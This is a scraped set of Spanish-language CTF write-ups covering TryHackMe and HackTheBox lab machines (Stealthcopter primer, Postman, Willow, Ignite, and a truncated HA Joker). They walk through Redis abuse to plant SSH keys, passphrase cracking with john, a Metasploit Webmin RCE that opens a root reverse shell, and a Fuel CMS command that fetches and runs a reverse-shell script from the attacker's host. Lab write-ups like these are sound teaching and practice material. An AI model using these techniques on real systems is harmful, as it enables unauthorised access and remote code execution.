sckull@uplifted:~/tmp/forensics$ gdb -q ./f.08 Reading symbols from ./f.08...(no debugging symbols found)...done. gdb-peda$ disas main [... snip ...] 0x00000000000011d4 \u0026lt;+43\u0026gt;:\tmov BYTE PTR [rbp-0x73],0x46 0x00000000000011d8 \u0026lt;+47\u0026gt;:\tmov BYTE PTR [rbp-0x72],0x4c 0x00000000000011dc \u0026lt;+51\u0026gt;:\tmov BYTE PTR [rbp-0x71],0x41 0x00000000000011e0 \u0026lt;+55\u0026gt;:\tmov BYTE PTR [rbp-0x70],0x47 0x00000000000011e4 \u0026lt;+59\u0026gt;:\tmov BYTE PTR [rbp-0x6f],0x7b 0x00000000000011e8 \u0026lt;+63\u0026gt;:\tmov BYTE PTR [rbp-0x6e],0x69 0x00000000000011ec \u0026lt;+67\u0026gt;:\tmov BYTE PTR [rbp-0x6d],0x6e 0x00000000000011f0 \u0026lt;+71\u0026gt;:\tmov BYTE PTR [rbp-0x6c],0x63 0x00000000000011f4 \u0026lt;+75\u0026gt;:\tmov BYTE PTR [rbp-0x6b],0x6f 0x00000000000011f8 \u0026lt;+79\u0026gt;:\tmov BYTE PTR [rbp-0x6a],0x72 0x00000000000011fc \u0026lt;+83\u0026gt;:\tmov BYTE PTR [rbp-0x69],0x72 0x0000000000001200 \u0026lt;+87\u0026gt;:\tmov BYTE PTR [rbp-0x68],0x65 0x0000000000001204 \u0026lt;+91\u0026gt;:\tmov BYTE PTR [rbp-0x67],0x63 0x0000000000001208 \u0026lt;+95\u0026gt;:\tmov BYTE PTR [rbp-0x66],0x74 0x000000000000120c \u0026lt;+99\u0026gt;:\tmov BYTE PTR [rbp-0x65],0x7d [... snip ...] HEX\n1 46 4c 41 47 7b 69 6e 63 6f 72 72 65 63 74 7d FLAG\n1 FLAG{incorrect} Con la frase correcta:\n1 2 3 4 5 6 sckull@uplifted:~/tmp/forensics$ ./f.08 Hello, please enter the flag: FLAG{incorrect} Well done, you got the flag correct!!! sckull@uplifted:~/tmp/forensics$ f.09 1 2 3 4 5 6 7 8 9 0f4d0db3668dd58cabb9eb409657eaa8 { d015cc465bdb4e51987df7fb870472d3fb9a3505 _ _ b109f3bbbc244eb82441917ed06d618b9008dd09b3befd1b5e07394c706a8bb980b1d7785e5976ec049b46df5f1326af5a2ea6d103fd07c95385ffab0cacbc86 _ d04b98f48e8f8bcc15c6ae5ac050801cd6dcfd428fb5f9e65c4e16e7807340fa } f.10 Brainfuck Language\nNetworking n.01.pcap Filtro: HTTP GET\nFLAG{n0w_y0ur_g3tt1ng_1t}\nn.02.pcap Filtro: HTTP POST\nFLAG{1_am_th3_p0stm4n}\nn.03.pcap USER AGENT\nFLAG{s3cr3t_ag3nt}\nn.04.pcap OBJECTS HTTP\nFLAG{h3r3_1_am}\nn.05.pcap SMB\nSMB OBJECT\n1 2 3 4 5 sckull@uplifted:~/tmp/networking$ tar -xvf smb_object05.tar flag.txt sckull@uplifted:~/tmp/networking$ cat flag.txt FLAG{smb_smb_smb_smb_smb_smb} sckull@uplifted:~/tmp/networking$ n.06.pcap FTP\nFLAG{1n3s3cur3_\nTELNET\npr0t0c0ls}\nFLAG{1n3s3cur3_pr0t0c0ls}\nn.07.pcap DNS\n1 46 4c 41 47 7b 64 6e 73 5f 33 78 66 31 6c 74 72 34 74 30 72 7d https://gchq.github.io/CyberChef/#recipe=From_Hex(\u0026#39;Auto\u0026#39;)\u0026amp;input=NDYgNGMgNDEgNDcgN2IgNjQgNmUgNzMgNWYgMzMgNzggNjYgMzEgNmMgNzQgNzIgMzQgNzQgMzAgNzIgN2Q FLAG{dns_3xf1ltr4t0r}\nn.08.pcap tcp and data\nFLAG{this is a hidden flag}\nn.09 7z File\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 sckull@uplifted:~/tmp/networking$ file n.09 n.09: 7-zip archive data, version 0.3 sckull@uplifted:~/tmp/networking$ xxd n.09 | head 00000000: 377a bcaf 271c 0003 46c0 dcbf d40b 0000 7z..\u0026#39;...F....... 00000010: 0000 0000 2300 0000 0000 0000 cf09 fa64 ....#..........d 00000020: 0068 33be 1c86 3077 60f4 a484 2585 fa1c .h3...0w`...%... 00000030: 7627 82f2 9186 dc88 ca27 bae3 fb13 c5ff v\u0026#39;.......\u0026#39;...... 00000040: 0e24 c288 d1b1 0114 695f 90fd b8ca a6d3 .$......i_...... 00000050: 2f38 db8c 915e 7e32 f588 4d5c 3f35 4a84 /8...^~2..M\\?5J. 00000060: 242d b5f0 8c96 a4e0 ce62 7105 5389 18f1 $-.......bq.S... 00000070: e946 8af0 1d2f a762 e91a 934b 32a6 7eb8 .F.../.b...K2.~. 00000080: 8322 16d1 2abc 32be 2107 1dae 03ac 6edf .\u0026#34;..*.2.!.....n. 00000090: e042 8551 7d12 e93f 57e4 fa2b 4f3d a993 .B.Q}..?W..+O=.. sckull@uplifted:~/tmp/networking$ mv n.09 n.09.7z sckull@uplifted:~/tmp/networking$ 7z e n.09.7z 7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21 p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,8 CPUs Intel(R) Core(TM) i5-8250U CPU @ 1.60GHz (806EA),ASM,AES-NI) Scanning the drive for archives: 1 file, 3095 bytes (4 KiB) Extracting archive: n.09.7z -- Path = n.09.7z Type = 7z Physical Size = 3095 Headers Size = 198 Method = LZMA:23 Solid = + Blocks = 1 Everything is Ok Files: 2 Size: 26112 Compressed: 3095 sckull@uplifted:~/tmp/networking$ sckull@uplifted:~/tmp/networking$ strings *.msg| grep FL FLAG\\{sn41L_m41L\\} FLAG{sn41L_m41L}\u0026lt;br\u0026gt; sckull@uplifted:~/tmp/networking$ n.10.pcap SSL Certificate\nSSL Wireshark: Edit \u0026gt; Preferences \u0026gt; Protocols \u0026gt; SSL \u0026gt; (Pre)-Master-Secret log filename \u0026gt; Select n.10.ssl.log\nFLAG{y0u_ar3_c3rt1f13d_n0w}\n","description":"Stealthcopter CTF Primer es una serie de retos de TryHackMe donde utilizamos distintas herramientas para resolver los retos.","id":151,"section":"posts","tags":[],"title":"TryHackMe - Stealthcopter CTF Primer1","uri":"https://sckull.github.io/posts/stealthcopter/"},{"content":"\rPostman es una maquina de HackTheBox que expone Redis donde logramos escribir nuestra clave publica de SSH y obtener acceso por este. Encontramos una clave privada encriptada la cual crackeamos con John para obtener acceso al siguiente usuario. Finalmente accedimos a Webmin y explotamos una vulnerabilidad que nos dio acceso privilegiado.\nInformacion de la Maquina Nombre Postman OS Linux Puntos 20 Dificultad Facil IP 10.10.10.160 Maker TheCyberGeek\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[7, 6.2, 7.8, 2.2, 3.8],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[9, 7, 10, 0, 3],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} NMAP Escaneo de puerto tcp/udp, en el cual nos muestra el puerto http (80) y el puerto de ssh (22) abierto.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 # Nmap 7.80 scan initiated Thu Dec 26 14:42:29 2019 as: nmap -p- --min-rate 1000 -o postman_nmap 10.10.10.160 Warning: 10.10.10.160 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.160 Host is up (0.26s latency). Not shown: 65213 closed ports, 318 filtered ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 6379/tcp open redis 10000/tcp open snet-sensor-mgmt # Nmap done at Thu Dec 26 14:45:40 2019 -- 1 IP address (1 host up) scanned in 191.74 seconds # Nmap 7.80 scan initiated Thu Dec 26 14:46:53 2019 as: nmap -sV -sC -p22,80,6379,10000 -o postman_nmap_v 10.10.10.160 Nmap scan report for 10.10.10.160 Host is up (0.25s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA) | 256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA) |_ 256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: The Cyber Geek\u0026#39;s Personal Website 6379/tcp open redis Redis key-value store 4.0.9 10000/tcp open http MiniServ 1.910 (Webmin httpd) |_http-title: Site doesn\u0026#39;t have a title (text/html; Charset=iso-8859-1). |_http-trane-info: Problem with XML parsing of /evox/about Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu Dec 26 14:47:36 2019 -- 1 IP address (1 host up) scanned in 43.58 seconds HTTP (Puerto 80) En el puerto 80 nos muestra una pagina que al parecer esta en construccion.\nPUERTO 6379 En el puerto 6379 nos muestra un mensaje de error.\nPUERTO 10000 En este puerto nos muestra un mensaje de error en el cual nos dice que probemos en el protocolo https.\nCambiamos a https y nos muestra un panel de Webmin.\nGOBUSTER - Puerto 80 Encontramos algunos directorios y archivos.\n1 2 3 4 5 6 7 8 9 root@aoiri:~/htb/postman# gobuster dir -u http://10.10.10.160/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 15 -q /css (Status: 301) /fonts (Status: 301) /images (Status: 301) /index.html (Status: 200) /index.html (Status: 200) /js (Status: 301) /server-status (Status: 403) /upload (Status: 301) REDIS PUERTO 6379 Como vimos en el reporte de nmap este puerto esta corriendo un servicio de redis 4.0.9. Al intentar conectarnos con el servicio mediante redis-tools podemos obtener informacion del mismo.\nREDIS - Explotacion Utilizando los comandos de redis podemos obtener informacion del directorio donde esta corriendo o esta siendo utilizado por redis, tambien el nombre del archivo (dbfilename).\nVemos que la configuracion del dbfilename es dump.rdb y el directorio esta ubicado en /var/lib/redis, para obtener acceso a la maquina mediante redis vamos a sobrescribir la configuracion, agregando el dbfilename como authorized_keys donde vamos a escribir nuestra clave publica de ssh y dir como /var/lib/redis/.ssh.\nREDIS SSH Generamos nuestra clave publica con ssh-keygen la cual vamos a utilizar para iniciar sesion en el servicio ssh.\nAntes de configurar redis debemos de agregar saltos de linea antes y despues en nuevo archivo agregando nuestra clave publica.\n1 (echo -e \u0026#34;\\n\\n\u0026#34;; cat id_rsa.pub; echo -e \u0026#34;\\n\\n\u0026#34;) \u0026gt; clave_publica.txt Utilizamos redis-cli localmente para agregar la configuracion que necesitamos a la maquina, con los comandos:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 #Configuracion dir redis-cli -h 10.10.10.160 config set dir /var/lib/redis/.ssh config get dir #Configuracion dbfilename config set dbfilename authorized_keys config get dbfilename SLAVEOF NO ONE save #Escritura de clave publica en nuestra key cat clave_publica.txt | redis-cli -h 10.10.10.160 -x set s-key get s-key Verificamos que nuestra clave publica se haya escrito en nuestra key (s-key):\nUtilizando nuestra clave privada iniciamos sesion con el usuario redis:\nVemos el historial del usuario redis, encontramos que el usuario edito un archivo de python y un archivo de id_rsa.bak:\nArchivo id_rsa.bak:\nUSER - Matt Utilizando la clave privada con el usuario Matt con ssh nos pregunta por la frase.\nUtilizamos ssh2john para obtener el hash del archivo y junto con john the ripper crackear la frase de la clave privada.\n1 2 python ssh2john.py id_rsa_matt \u0026gt; id_rsa_matt.hash john --format=SSH --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_matt.hash FRASE: computer2008\nObtenemos la frase pero al intentar utilizarla con la clave privada no nos permite iniciars sesion.\nUtilizamos la misma frase como contraseña de Matt y con el comando su, obtuvimos una shell con el usuario Matt y nuestra flag user.txt.\nFlag:\nPRIVILEGE ESCALATION Utilizamos las credenciales de Matt en el puerto 10000 o webmin panel, exitosamente logramos iniciar sesion.\nLa version de webmin menores o iguales a 1.910 tienen una vulnerabilidad (CVE:2019-12840) que permite la ejecucion de comandos, configuramos metasploit con el cve, añadimos las credenciales de Matt y utilizamos SSL.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 msf5 \u0026gt; search 2019-12840 Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/linux/http/webmin_packageup_rce 2019-05-16 excellent Yes Webmin Package Updates Remote Command Execution msf5 \u0026gt; use exploit/linux/http/webmin_packageup_rce msf5 exploit(linux/http/webmin_packageup_rce) \u0026gt; msf5 exploit(linux/http/webmin_packageup_rce) \u0026gt; show options Module options (exploit/linux/http/webmin_packageup_rce): Name Current Setting Required Description ---- --------------- -------- ----------- PASSWORD yes Webmin Password Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS yes The target host(s), range CIDR identifier, or hosts file with syntax \u0026#39;file:\u0026lt;path\u0026gt;\u0026#39; RPORT 10000 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections TARGETURI / yes Base path for Webmin application USERNAME yes Webmin Username VHOST no HTTP server virtual host Payload options (cmd/unix/reverse_perl): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Webmin \u0026lt;= 1.910 msf5 exploit(linux/http/webmin_packageup_rce) \u0026gt; set rhosts 10.10.10.160 rhosts =\u0026gt; 10.10.10.160 msf5 exploit(linux/http/webmin_packageup_rce) \u0026gt; msf5 exploit(linux/http/webmin_packageup_rce) \u0026gt; show options Module options (exploit/linux/http/webmin_packageup_rce): Name Current Setting Required Description ---- --------------- -------- ----------- PASSWORD yes Webmin Password Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS 10.10.10.160 yes The target host(s), range CIDR identifier, or hosts file with syntax \u0026#39;file:\u0026lt;path\u0026gt;\u0026#39; RPORT 10000 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections TARGETURI / yes Base path for Webmin application USERNAME yes Webmin Username VHOST no HTTP server virtual host Payload options (cmd/unix/reverse_perl): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Webmin \u0026lt;= 1.910 msf5 exploit(linux/http/webmin_packageup_rce) \u0026gt; set lhost tun0 lhost =\u0026gt; 10.10.14.67 msf5 exploit(linux/http/webmin_packageup_rce) \u0026gt; set USERNAME Matt USERNAME =\u0026gt; Matt msf5 exploit(linux/http/webmin_packageup_rce) \u0026gt; set PASSWORD computer2008 PASSWORD =\u0026gt; computer2008 msf5 exploit(linux/http/webmin_packageup_rce) \u0026gt; set SSL true SSL =\u0026gt; true msf5 exploit(linux/http/webmin_packageup_rce) \u0026gt; run [*] Started reverse TCP handler on 10.10.14.67:4444 [+] Session cookie: 4c7f4b517283e96d41da23ced104e00a [*] Attempting to execute the payload... [*] Command shell session 1 opened (10.10.14.67:4444 -\u0026gt; 10.10.10.160:42436) at 2019-12-29 22:13:48 -0600 id uid=0(root) gid=0(root) groups=0(root) whoami; pwd root /usr/share/webmin/package-updates/ Obtenemos una sesion con privilegios root y nuestra flag root.txt.\n","description":"Postman es una maquina de HackTheBox que expone Redis donde logramos escribir nuestra clave publica de SSH y obtener acceso por este. Encontramos una clave privada encriptada la cual crackeamos con John para obtener acceso al siguiente usuario. Finalmente accedimos a Webmin y explotamos una vulnerabilidad que nos dio acceso privilegiado.","id":152,"section":"posts","tags":["webmin","redis-cli","metasploit"],"title":"Hack The Box - Postman","uri":"https://sckull.github.io/posts/postman/"},{"content":"\rWillow es una maquina de TryHackMe, encontramos un reto que nos permitio generar una clave privada encriptada a la cual encontramos la frase secreta con John lo que nos permitio obtener acceso por SSH. Encontramos credenciales al montar una particion, con ello logramos acceder como root.\nRoom Titulo Willow Descripción What lies under the Willow Tree? Puntos 60 Dificultad Media Maker MuirlandOracle NMAP Escaneo de puerto tcp, en el cual nos muestra varios puertos abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 # Nmap 7.80 scan initiated Fri Feb 28 14:00:08 2020 as: nmap -sV -p- --min-rate=1000 -o nmap_rate willow.thm Nmap scan report for willow.thm Host is up (0.19s latency). Not shown: 65531 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 6.7p1 Debian 5 (protocol 2.0) 80/tcp open http Apache httpd 2.4.10 ((Debian)) 111/tcp open rpcbind 2-4 (RPC #100000) 2049/tcp open nfs 2-4 (RPC #100003) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Feb 28 14:01:52 2020 -- 1 IP address (1 host up) scanned in 103.49 seconds HTTP GOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 root@aoiri:~/tryhackme/new_rom# gobuster dir -u http://willow.thm/ -w /usr/share/wordlists/dirb/common_nofirst10.txt -q -t 25 -x php,html,txt /index.html (Status: 200) /index.html (Status: 200) /server-status (Status: 403) USER - Willow PRIVATE KEY En la pagina principal de willow encontramos una cadena en hexadecimal.\nUtilizamos CyberChef para decodificar el contenido de esta cadena.\nÈncontramos un mensaje en el que indica que la clave privada de Willow esta encriptada - Asumimos que willow es un usuario registrado en la maquina:\nHey Willow, here\u0026#39;s your SSH Private key -- you know where the decryption key is! Adjunto al mensaje, una lista de numeros.\nNFS En el puerto 2049 encontramos un punto de montaje el cual puede utilizar cualquiera (nobody:nogroup), utilizamos mount para montar la carpeta permitida (/var/failsafe).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 root@aoiri:~/tryhackme/willow# showmount -e willow.thm Export list for willow.thm: /var/failsafe * root@aoiri:~/tryhackme/willow# mkdir tmp_nfs root@aoiri:~/tryhackme/willow# pwd /root/tryhackme/willow root@aoiri:~/tryhackme/willow# mount -t nfs willow.thm:/var/failsafe /root/tryhackme/willow/tmp_nfs/ root@aoiri:~/tryhackme/willow# ls tmp_nfs/ rsa_keys root@aoiri:~/tryhackme/willow# cd tmp_nfs/ root@aoiri:~/tryhackme/willow/tmp_nfs# cat rsa_keys Public Key Pair: (23, *****) Private Key Pair: (*****, *****) root@aoiri:~/tryhackme/willow/tmp_nfs# ls -lah total 12K drwxr--r-- 2 nobody nogroup 4.0K Jan 30 10:31 . drwxr-xr-x 3 root root 4.0K Feb 28 14:05 .. -rw-r--r-- 1 root root 62 Jan 30 10:31 rsa_keys root@aoiri:~/tryhackme/willow/tmp_nfs# El contenido del archivo que encontramos en la carpeta es rsa_keys que contiene las claves para la clave publica y la clave privada.\n1 2 3 root@aoiri:~/tryhackme/willow/tmp_nfs# cat rsa_keys Public Key Pair: (23, *****) Private Key Pair: (*****, *****) En este post RSA Encription explica a la perfeccion como funcionan, encriptacion y desencriptacion de RSA. Para este reto escribi un pequeño script en python que por cada numero que encontramos en el mensaje, lo vamos a convertir a hexadecimal utilizando las claves (6\u0026mdash;7, 3\u0026mdash;7) del archivo rsa_keys, en este caso vamos a utilizar el de la clave privada para poder conectarnos atraves del servicio SSH. Una vez hecho lo anterior convertimos a texto el mensaje (lista) en hexadecimal que obtuvimos.\nEjecutamos nuestro script y obtenemos nuestra clave privada:\nUtilizamos la clave para iniciar sesion en el servicio de SSH pero esta esta protegida por una frase.\nUtilizamos John para obtener el hash de la clave y obtener la frase.\nUna vez con la frase de nuestro archivo, iniciamos sesion en el servicio SSH y obtenemos nuestra shell con usuario Willow.\nEncontramos una imagen en la carpeta principal de Willow:\nLa codificamos a base64 y utilizamos nuevamente CyberChef para renderizar nuestra imagen (podemos utilizar scp btw), obtenemos nuestra flag user.txt:\nPRIVILEGE ESCALATION Enumeramos los comandos que podemos ejecutar sin contraseña utilizando sudo sudo -l -l y vemos que podemos utilizar mount.\nRevisamos /mnt/ y encontramos la carpeta /creds que no contiene nada.\nVemos el contenido de /dev en donde se supone estan las \u0026ldquo;particiones\u0026rdquo; montadas, y podemos ver inmediatamente hidden_backup lo cual no es muy comun de encontrar.\nYa que podemos utilizar mount con sudo vamos a proceder a montar esta \u0026ldquo;particion\u0026rdquo; en /mnt/creds (puede ser en cualquier otra carpeta a la que willow tenga acceso).\nEncontramos las credenciales del usuario root y willow, cambiamos al usuario root y dentro de su carpeta encontramos un mensaje en root.txt.\nLa nota nos indica que la flag root.txt ya nos fue dada antes de que obtuvieramos una shell, recordemos que la primera flag la encontramos en la imagen, regresamos a la imagen que encontramos y extraemos su contenido con la contraseña de root, en donde podemos ver nuestra ultima flag.\n","description":"Willow es una maquina de TryHackMe, encontramos un reto que nos permitio generar una clave privada encriptada a la cual encontramos la frase secreta con John lo que nos permitio obtener acceso por SSH. Encontramos credenciales al montar una particion, con ello logramos acceder como root.","id":153,"section":"posts","tags":["nfs","showmount","steghide","steganography"],"title":"TryHackMe - Willow","uri":"https://sckull.github.io/posts/willow/"},{"content":"\rIgnite es una maquina de TryHackMe, se presenta Fuel CMS donde explotamos una vulnerabilidad para obtener acceso mediante una shell y finalmente escalamos privilegios con contraseñas almacenadas.\nRoom Titulo Ignite Descripción A new start-up has a few issues with their web server. Puntos 110 Dificultad Facil Maker DarkStar7471 NMAP Escaneo de puerto tcp, en el cual nos muestra varios puertos abiertos.\n1 2 3 4 5 6 7 8 9 # Nmap 7.80 scan initiated Mon Mar 2 17:50:06 2020 as: nmap -sV -p- --min-rate=1000 -o nmap_rate 10.10.169.161 Nmap scan report for 10.10.169.161 Host is up (0.20s latency). Not shown: 65534 closed ports PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon Mar 2 17:51:40 2020 -- 1 IP address (1 host up) scanned in 94.48 seconds GOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 7 8 9 10 11 root@aoiri:~/tryhackme/ignite# gobuster dir -u ignite.thm -w /usr/share/wordlists/dirb/common_nofirst10.txt -q -t 15 -x php,html,txt /0 (Status: 200) /assets (Status: 301) /home (Status: 200) /index (Status: 200) /index.php (Status: 200) /index.php (Status: 200) /offline (Status: 200) /robots.txt (Status: 200) /robots.txt (Status: 200) /server-status (Status: 403) HTTP Pagina en el puerto 80, en esta nos muestra los pasos que se deben de seguir para instalar el Fuel CMS.\nEn una de las instrucciones nos muestra las credenciales para ingresar en el dashboard de este CMS.\nEntramos en el CMS con las credenciales.\nRCE Fuel CMS 1.4.1 Buscamos un exploit para este CMS encontramos uno para ejecutar comandos, este exploit necesita burpsuite para poder funcionar en el puerto 8080 aunque no es necesario. Ejecutamos un comando y vemos los archivos del sistema.\nFuel CMS 1.4.1\nCreamos un archivo bash en el que contiene nuestra shell inversa, descargamos y ejecutamos nuestra shell.\nExploit:\n1 cmd:wget 10.8.1.72/shell.sh \u0026amp;\u0026amp; bash shell.sh Obtenemos una shell inversa con el usuario www-data.\nEncontramos nuestra flag user.txt en la carpeta /home.\nPRIVILEGE ESCALATION Enumeramos los archivos en la maquina, en los archivos del CMS encontramos las credenciales de la base de datos.\nUtilizamos su con la contraseña de root y obtenemos una shell y nuestra flag root.txt.\n","description":"Ignite es una maquina de TryHackMe, se presenta Fuel CMS donde explotamos una vulnerabilidad para obtener acceso mediante una shell y finalmente escalamos privilegios con contraseñas almacenadas.","id":154,"section":"posts","tags":["Fuel CMS"],"title":"TryHackMe - Ignite","uri":"https://sckull.github.io/posts/ignite/"},{"content":"\rHA Joker CTF es una maquina de TryHackMe, enfocada en la tematica de Joker donde descubrimos un login donde utilizamos Hydra para obtener acceso, que luego nos permitió obtener un backup de la base de datos de Joomla, y con este ultimo obtuvimos acceso modificando una plantilla. Finalmente escalamos privilegios creando un nuevo contenedor con privilegios con lxc.\nRoom Titulo HA Joker CTF Descripción Batman hits Joker. Puntos 500 Dificultad Media Maker ki11switch NMAP Escaneo de puerto tcp, en el cual nos muestra varios puertos abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 # Nmap 7.80 scan initiated Thu Feb 27 14:33:03 2020 as: nmap -sV -p- --min-rate=1000 -o nmap_rate jokerctf.thm Warning: 10.10.171.105 giving up on port because retransmission cap hit (10). Nmap scan report for jokerctf.thm (10.10.171.105) Host is up (0.24s latency). Not shown: 65532 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) 8080/tcp open http Apache httpd 2.4.29 Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu Feb 27 14:34:50 2020 -- 1 IP address (1 host up) scanned in 107.72 seconds HTTP En el puerto 80 encontramos una pagina que nos muestra distintas imagenes del joker.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 7 8 9 10 root@aoiri:~/tryhackme/jokerctf# gobuster dir -u http://jokerctf.thm/ -w /usr/share/wordlists/dirb/common_nofirst10.txt -q -t 15 -x php,html,txt /css (Status: 301) /img (Status: 301) /index.html (Status: 200) /index.html (Status: 200) /phpinfo.php (Status: 200) /phpinfo.php (Status: 200) /secret.txt (Status: 200) /server-status (Status: 403) root@aoiri:~/tryhackme/jokerctf# /secret.txt HTTP - Puerto 8080 En el puerto 8080 encontramos un panel donde nos pide un usuario y contraseña.\nHydra Utilizamos hydra con los usuarios joker y batman junto con el wordlist rockyou.txt en el puerto 8080.\nAl iniciar sesion con las credenciales vemos una nueva pagina, a simple vista podemos ver que es un CMS Joomla.\nRUSTBUSTER Utilizamos RUSTBUSTER para busqueda de directorios y archivos (por alguna razon gobuster no aceptaba los headers).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 root@aoiri:~/tryhackme/jokerctf# /opt/rustbuster/rustbuster dir -u http://jokerctf.thm:8080/ -w /usr/share/wordlists/dirb/common_nofirst10.txt -t 25 -e php,html,txt -H \u0026#34;Authorization: Basic am9rZXI6aGFubmFo,Cookie: 5fef75b50575ebea33a28bd1e7087dcb=et845u1qtnkv5io3ak6msfmdim; 0d073d2ec68ac2f24f859831bbe8843b=3r1udjnnh7dk8bv4jt7gpadh5r\u0026#34; ~ rustbuster v3.0.3 ~ by phra \u0026amp; ps1dr3x ~ _ _ _ _ _ _ _ _ _ _ /\\ \\ /\\_\\ / /\\ /\\ \\ / /\\ /\\_\\ / /\\ /\\ \\ /\\ \\ /\\ \\ / \\ \\/ / / _ / / \\ \\_\\ \\ / / \\ / / / _ / / \\ \\_\\ \\ / \\ \\ / \\ \\ / /\\ \\ \\ \\ \\__ /\\_\\/ / /\\ \\__ /\\__ \\ / / /\\ \\ \\ \\ \\__ /\\_\\/ / /\\ \\__ /\\__ \\ / /\\ \\ \\ / /\\ \\ \\ / / /\\ \\_\\ \\___\\ / / / / /\\ \\___\\/ /_ \\ \\ / / /\\ \\ \\ \\ \\___\\ / / / / /\\ \\___\\/ /_ \\ \\ / / /\\ \\_\\ / / /\\ \\_\\ / / /_/ / /\\__ / / / /\\ \\ \\ \\/___/ / /\\ \\ \\/ / /\\ \\_\\ \\ \\__ / / / /\\ \\ \\ \\/___/ / /\\ \\ \\/ /_/_ \\/_/ / / /_/ / / / / /__\\/ / / / / / / / \\ \\ \\ / / / \\/_/ / /\\ \\ \\___\\ / / / / / / \\ \\ \\ / / / \\/_/ /____/\\ / / /__\\/ / / / /_____/ / / / / / _ \\ \\ \\ / / / / / / \\ \\ \\__// / / / / _ \\ \\ \\ / / / / /\\____\\/ / / /_____/ / / /\\ \\ \\ / / /___/ / /_/\\__/ / / / / / / / 